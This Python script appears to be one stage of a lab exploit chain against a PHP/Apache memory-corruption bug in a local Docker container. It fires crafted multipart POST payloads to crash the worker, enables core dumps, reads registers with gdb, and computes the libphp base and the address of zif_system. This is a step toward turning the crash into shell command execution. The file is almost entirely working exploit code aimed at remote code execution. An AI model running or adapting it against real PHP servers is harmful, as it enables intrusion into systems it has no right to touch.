#!/usr/bin/env python3
"""oom71A: calibration crash with fat VALUES (MM tile) + patterned names.
Reads back from the core:
  1. heap base (rsi) + marker-value VA (first tile run)
  2. libphp base (rip - 0x49be7b) -> &zif_system
  3. CRITICAL: where did the walked window land — name bytes or value
     bytes? (rdi byte content decides the aiming design)
"""
import subprocess, sys, time, struct, re

sys.path.insert(0, '/Users/vlad/Projects/queue/php2shell-lab')
import payload68 as P

HOST = "http://127.0.0.1:8081/oom_sapi.php"
MMT = b"MM\x01\x02\x03\x04\x05\x06" * 2   # unique marker tile, NUL-free


def sh(c, t=90):
    r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
    return (r.stdout + r.stderr).strip()


def post(att):
    import urllib.request
    req = urllib.request.Request(
        HOST, data=att,
        headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return "200", r.read(300)
    except Exception as e:
        return "ERR", str(e)[:150].encode()


print("[0] core env + boot", flush=True)
sh("docker exec php_vuln sh -c \"grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars\"")
sh("docker exec php_vuln sh -c \"printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf\"")
sh("docker exec php_vuln sh -c 'rm -f /tmp/core*'")
subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
for _ in range(40):
    time.sleep(1.5)
    if "lim=8M" in sh("curl -s -m 5 " + HOST, 10):
        break
md5 = sh("docker exec php_vuln md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
assert md5 == P.STOCK_MD5, md5

print("[1] warm + sacrifice with fat values", flush=True)
for i, k1 in enumerate(P.K1S[:-1]):
    post(P.build_attack(k1, 9100000 + i * 100000, value_tile=MMT))
code, body = post(P.build_attack(3400, 9200000, value_tile=MMT))
print("  fire: %s %r" % (code, body[:60]), flush=True)
if code == "200":
    print("  NO CRASH — geometry changed with fat values; stop.", flush=True)
    sys.exit(1)
time.sleep(3)

print("[2] fetch core + registers (gdb runs in phpbuild)", flush=True)
sh("docker cp php_vuln:/tmp/core /tmp/core71A && docker cp /tmp/core71A phpbuild:/tmp/core.71A", 240)
out = sh("docker exec phpbuild sh -c 'gdb -q -batch "
         "-ex \"info registers rdi rip rsi rsp rbx\" /tmp/libphp.69.so /tmp/core.71A'", 240)
print(out[-800:], flush=True)

rdi = int(re.search(r"rdi\s+0x([0-9a-f]+)", out).group(1), 16)
rip = int(re.search(r"rip\s+0x([0-9a-f]+)", out).group(1), 16)
rsi = int(re.search(r"rsi\s+0x([0-9a-f]+)", out).group(1), 16)
rbx = re.search(r"rbx\s+0x([0-9a-f]+)", out)
rbx = int(rbx.group(1), 16) if rbx else 0

data = open("/tmp/core71A", "rb").read()
e_phoff = struct.unpack_from("<Q", data, 0x20)[0]
phent = struct.unpack_from("<H", data, 0x36)[0]
e_phnum = struct.unpack_from("<H", data, 0x38)[0]
loads = []
for i in range(e_phnum):
    o = e_phoff + i * phent
    t = struct.unpack_from("<I", data, o)[0]
    off_, va, pa, fsz, msz = struct.unpack_from("<QQQQQ", data, o + 8)
    if t == 1 and fsz >= 4 * 1024 * 1024:
        loads.append((va, off_, fsz))
hva, hoff, hsz = loads[0]
print("heap segment VA 0x%x (rsi-region) size %d" % (hva, hsz), flush=True)

heap = data[hoff:hoff + hsz]
mi = heap.find(MMT * 8)
print("marker tile first @ VA 0x%x" % (hva + mi) if mi >= 0 else "MARKER NOT IN HEAP", flush=True)

print("[3] VERDICT INPUTS", flush=True)
print("  libphp base = 0x%x  -> &zif_system = 0x%x" % (rip - 0x49be7b, rip - 0x49be7b + 0x39b8a0), flush=True)
print("  crash rip=0x%x (+539 expected: 0x49be7b static)" % rip, flush=True)
print("  rdi bytes: %s" % struct.pack("<Q", rdi).hex(), flush=True)
wire = P.cell_pattern(0x414141414141)
print("  wire name tile: %s" % wire, flush=True)
w8 = struct.pack("<Q", rdi)
cyc = (wire + wire)
idx = cyc.find(w8[:4])
print("  window starts at wire-tile rotation %d" % idx, flush=True)
print("  rbx (walk ptr) = 0x%x; rbx - rsi = 0x%x" % (rbx, rbx - rsi) if rbx else "no rbx", flush=True)

# where are marker values relative to name pattern? distance hint:
pi = heap.find(b"AAAAAAzzzzzzzzzz")
print("first name-pattern @ VA 0x%x; marker-name delta = %d" % (hva + pi, mi - pi) if pi >= 0 and mi >= 0 else "pattern not found", flush=True)

print("[4] restore", flush=True)
sh("docker exec php_vuln sh -c 'rm -f /etc/apache2/conf-enabled/oomcore.conf && sed -i \"/ulimit -c/d\" /etc/apache2/envvars'")
subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
time.sleep(8)
print("    restored:", sh("curl -s -m 5 " + HOST, 10), flush=True)
